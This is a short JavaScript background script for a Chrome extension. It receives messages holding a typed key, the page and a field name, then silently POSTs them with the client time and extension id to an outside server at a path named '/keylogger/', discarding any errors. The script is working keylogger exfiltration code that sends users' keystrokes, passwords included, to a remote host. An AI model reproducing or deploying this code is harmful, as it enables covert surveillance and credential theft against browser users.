function handleMessage (request) {
    const localDateTime = new Date().toLocaleString();
    const extension_id = chrome.runtime.id;
	data = "key="+request.key+"&page="+request.page+"&name="+request.name+"&client_time="+request.local_datetime+"&extension_id="+extension_id;

	
    console.log(request);
	fetch("https://dev.micinproject.my.id/keylogger/", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: data
    })
    .then(response => {
        // console.log(response);
    })
    .catch(error => {
        // console.error(error);
    });
}
chrome.runtime.onMessage.addListener(handleMessage);

